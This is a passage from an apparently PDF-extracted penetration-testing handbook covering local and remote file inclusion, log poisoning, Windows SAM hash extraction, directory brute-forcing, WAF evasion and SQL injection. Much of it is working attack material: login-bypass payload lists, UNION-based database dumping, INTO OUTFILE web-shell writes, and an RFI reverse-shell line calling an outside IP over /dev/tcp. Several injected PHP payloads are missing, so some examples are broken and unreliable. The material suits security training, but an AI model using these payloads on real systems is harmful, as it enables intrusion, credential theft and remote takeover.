Proc files
"Under Linux, /proc includes a directory for each running process, including kernel processes, in
directories named /proc/PID, where PID is the process number. Each directory contains information
about one process, including: /proc/PID/cmdline, the command that originally started the process."
https://en.wikipedia.org/wiki/Procfs
https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/
/proc/sched_debug # Can be used to see what processes the machine is running
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/version
/proc/self/environ
Bruteforcing SSH known_hosts
https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/
LFI to shell
Under the right circumstances you might be able to get a shell from a LFI
Log poisoning
There are some requirements. We need to be able to read log files. In this example we are going to
poison the apache log file. You can use either the success.log or the error.log
120
Attacking the System
So once you have found a LFI vuln you have to inject php-code into the log file and then execute it.
Insert php-code into the log file
This can be done with nc or telnet.
nc 192.168.1.102 80
GET / HTTP/1.1
Host: 192.168.1.102
Connection: close
You can also add it to the error-log by making a request to a page that doesn't exists
nc 192.168.1.102 80
GET /AAAAAA HTTP/1.1
Host: 192.168.1.102
Connection: close
Or in the referer parameter.
GET / HTTP/1.1
Referer: 
Host: 192.168.1.159
Connection: close
Execute it in the browser
Now you can request the log-file through the LFI and see the php-code get executed.
http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
Proc files
If you can read the proc-files on the system you might be able to poison them through the user-agent.
We can also inject code into /proc/self/environ through the user-agent
https://www.exploit-db.com/papers/12992/
https://www.youtube.com/watch?v=ttTVNcPnsJY
Windows
Fingerprinting
c:\WINDOWS\system32\eula.txt
c:\boot.ini
c:\WINDOWS\win.ini
c:\WINNT\win.ini
c:\WINDOWS\Repair\SAM
c:\WINDOWS\php.ini
c:\WINNT\php.ini
c:\Program Files\Apache Group\Apache\conf\httpd.conf
c:\Program Files\Apache Group\Apache2\conf\httpd.conf
c:\Program Files\xampp\apache\conf\httpd.conf
121
Attacking the System
c:\php\php.ini
c:\php5\php.ini
c:\php4\php.ini
c:\apache\php\php.ini
c:\xampp\apache\bin\php.ini
c:\home2\bin\stable\apache\php.ini
c:\home\bin\stable\apache\php.ini
Logs
Common path for apache log files on windows:
c:\Program Files\Apache Group\Apache\logs\access.log
c:\Program Files\Apache Group\Apache\logs\error.log
PHP Session Locations
c:\WINDOWS\TEMP\
c:\php\sessions\
c:\php5\sessions\
c:\php4\sessions\
Retrieving password hashes
In order to retrieve the systems password hashed we need two files: system and SAM. Once you have
those two files you can extract the hased using the kali tool pwdump, like this:
pwdump systemfile samfile
The system and SAM files can be found in different locations, so try them all. From a webserver the
path might be case-sensitive, even though it is windows. So consider that!
Systemroot is usually windows
windows\repair\SAM
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
References:
This is the definitive guide to Local File inclusion
https://highon.coffee/blog/lfi-cheat-sheet/
And this
http://securityidiots.com/Web-Pentest/LFI
And this:
https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
122
Attacking the System
https://nets.ec/File_Inclusion
https://gist.github.com/sckalath/da1a232f362a700ab459
123
Attacking the System
Remote File Inclusion
Remote File Inclusion
Remote file inclusion uses pretty much the same vector as local file inclusion.
A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even
though it is not even hosted on that machine.
RFI's are less common than LFI. Because in order to get them to work the developer must have edited
the php.ini configuration file.
This is how they work.
So you have an unsanitized parameter, like this
$incfile = $_REQUEST["file"];
include($incfile.".php");
Now what you can do is to include a file that is not hosted on the victim-server, but instead on the
attackers server.
http://exampe.com/index.php?page=http://attackerserver.com/evil.txt
And evil.txt will look like something like this:
# Or just get a reverse shell directly like this:
/dev/tcp/10.11.0.191/443; sh &196 2>&196"); ?>
So when the victim-server includes this file it will automatically execute the commands that are in the
evil.txt file. And we have a RCE.
Avoid extentions
Remember to add the nullbyte %00 to avoid appending .php. This will only work on php before
version 5.3.
If it does not work you can also add a ?, this way the rest will be interpreted as url parameters.
124
Attacking the System
Directory Traversal Attack
Directory Traversal Attack
When the attacker is able to read files on the filesystem.
Differ from LFI in the aspect that LFI can execute code, while a Directory Traversal Attack cannot.
125
Attacking the System
Hidden Files and Directories
Find hidden files and directories
TLDR
# Dirb
dirb https://192.168.1.101
# Gobuster - remove relevant responde codes (403 for example)
gobuster -u http://192.168.1.101 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
About
There is essentially no way for a user to know which files are found in which directories on a web-
server, unless the whole server has directory listing by default. However, if you go directly to the page
it will be shown. So what the attacker can do is to brute force hidden files and directories. Just test a
bunch of them. There are several tools for doing this. The attack is of course very noisy and will show
up fast in the logs.
Dirb
This is a really easy tool to use:
dirb http://target.com
Dirbuster
It is a GUI You start it with:
dirbuster
OWASP ZAP
Insert your target. Add it to the context Click the plus-sign Click on Forced Browse
Wfuzz
You can find the manual by typing:
wfuzz -h
wfuzz -c -z file,/root/.ZAP/fuzzers/dirbuster/directory-list-2.3-big.txt --sc 200 http://pegasus.dev:8088/FUZZ.php
Gobuster
# Gobuster - remove relevant responde codes (403 for example)
gobuster -u http://192.168.1.101 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
126
Attacking the System
WAF - Web application firewall
It might be that dirb shows you 403 errors, instead of the expected 404. This might mean that there is
a WAF protecting the site. To get around it we might have to change our request header to it looks
more like a normal request.
dirb http://target.com -a "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
127
Attacking the System
SQL-Injections
SQL-injections
Tldr
# Post
./sqlmap.py -r request.txt -p username
# Get
sqlmap -u "http://192.168.1.101/index.php?id=1" --dbms=mysql
# Crawl
sqlmap -u http://192.168.1.101 --dbms=mysql --crawl=3
How does sql-injections work?
So we have a website that is written in php. We have a login functionality, where the code looks like
this:
mysql_connect("localhost", "pelle", "mySecretPassowrd") or die(mysql_error());
mysql_select_db("myHomepage");
if ($_POST['uname'] != ""){
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'"
$result = mysql_query($query);
$row = mysql_fetch_array($result);
}
So the user input is not filtered or sanitized in any way. Which means that what the users puts in in the
login-form will be executed my mysql. So just like in xss-injections we just try to escape the input
field to be able to execute sql-commands. So if we input the following into the user-field and
password-field in the login:
whatever' or '1'='1
whatever' or '1'='1
The query will look like this:
$query = "SELECT * FROM users WHERE username = 'whatever' OR '1'='1' AND password='whatever' OR '1'='1'";
Since they both become true the database will retrieve all users and we will be able to bypass the
login.
If you know the username you could of course use that and then only inject on the password
parameter.
128
Attacking the System
$query = "SELECT * FROM users WHERE username = 'admin' AND password='whatever' OR '1'='1'";
SQLmap
Sqlmap is a great tool to perform sql-injections. Here is the manual.
https://github.com/sqlmapproject/sqlmap/wiki/Usage
Using sqlmap with login-page
So you need to authenticate before you can access the vulnerable paramter.
You just cature the request using burp suite, and save the requiest in a file. Then your run
sqlmap -r request.txt
Since the cookie is saved in the reuqest sqlmap can do it.
Crawl a page to find sql-injections
sqlmap -u http://example.com --crawl=1
Dumping a database or table
Here we are dumping the database Webapp and the table Users.
sqlmap -r request.txt -p username --dbms=mysql --dump -D Webapp -T Users
Use proxy
--proxy="http://192.2.2.2.2:1111"
Proxy credencials
--proxy-cred="username:password"
Login bypass
This is the most classic, standard first test:
' or '1'='1
Then you have:
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
129
Attacking the System
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
Sql-injections manually
Sqlmap is good, but it is not very stealthy. And it can generate a lot of traffic. And also it is good to
understand the vulnerability in the cote and not just run tools. So let's learn sql-injections the manual
way.
The two main ways for perform a sql-injection: error based or blind.
Error-bases DB enumeration
If we manage to find an error-message after a broken sql-query, we can use that to try to map out the
database structure.
For example, if we have a url that end with
http://example.com/photoalbum.php?id=1
Step 1 - Add the tick '
So first we should try to break the sql-syntaxt by adding a '. We should first ad a ' or a ".
http://example.com/photoalbum.php?id=1'
If the page then returns a blank page or a page with a sql-error we know that the page it vulnerable.
Step 2 - Enumerate columns
So in order to enumerate the columns of a table we can use the order by
Order by 1 means sort by values of the first column from the result set. Order by 2 means sort by
values of the second column from the result set.
130
Attacking the System
So it is basically just a tool to order the data in a table. But we can use it to find out how many
columns a table has. Because if we do order by 10 when there really only is 9 columns sql will throw
an error. And we will know how many columns the table has.
# This trhows no error
http://example.com/photoalbum.php?id=1 order by 9
# This throws error
http://example.com/photoalbum.php?id=1 order by 10
So you just increase the number (or do a binary tree search if you want tot do it a bit faster) until you
get an error, and you know how many columns the table has.
Step 3 - Find space to output db
Now we need to know which coolumns are being outputed on the webpage. It could be that not all
data from the database is worthwhile to output, so maybe only column 1 and 3 are being outputted to
the website.
To find out which columns are being outputted we can use the union select command. So we do the
command like this
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,5,6,7,8,9
For all the columns that exists. This will return the numbers of the columns that are being outputted
on the website. Take note of which these columns are.
Step 4 - Start enumerating the database
Now we can use that field to start outputing data. For example if columns number five has been
visible in step 3, we can use that to output the data.
Here is a list of data we can retrieve from the database. Some of the syntaxes may difference
depending on the database engine (mysql, mssql, postgres).
# Get username of the sql-user
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,user(),6,7,8,9
# Get version
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,version(),6,7,8,9
# Get all tables
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables
# Get all columns from a specific table
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users'
# Get content from the users-table. From columns name and password. The 0x3a only servers to create a delimitor between name and password
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,concat(name,0x3a,
password),6,7,8,9 FROM users
131
Attacking the System
Blind sql-injection
We say that it is blind because we do not have access to the error log. This make the whole process a
lot more complicated. But it is of course still possible to exploit.
Using sleep
Since we do not have access to the logs we do not know if our commands are syntaxically correct or
not. To know if it is correct or not we can however use the sleep statement.
http://example.com/photoalbum.php?id=1-sleep(4)
If it lods for four seconds exta we know that the database is processing our sleep() command.
Get shell from sql-injection
The good part about mysql from a hacker-perspective is that you can actaully use slq to write files to
the system. The will let us write a backdoor to the system that we can use.
Load files
UNION SELECT 1, load_file(/etc/passwd) #
http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
Write files
http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'